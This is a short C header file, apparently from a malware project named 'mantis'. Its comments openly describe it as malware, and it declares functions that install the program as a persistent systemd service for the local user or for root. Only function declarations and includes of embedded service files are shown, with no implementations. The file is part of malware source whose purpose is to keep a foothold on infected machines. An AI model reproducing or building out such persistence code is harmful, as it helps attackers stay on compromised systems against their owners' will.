// persistence.h
// Stay a while, will ya?

#ifndef __PERSISTENCE_H
#define __PERSISTENCE_H

#include "embeds/mantis_service_user.service.h"

// Installs itself (the malware) as a service for the local user.
// (`systemctl --user`)
int install_user_service(void);

#include "embeds/mantis_service_root.service.h"

// Installs itself (the malware) as a service for root. Assumes root
// priviledge. Generally, this'll go wrong if not lol.
int install_root_service(void);

#endif /* __PERSISTENCE_H */

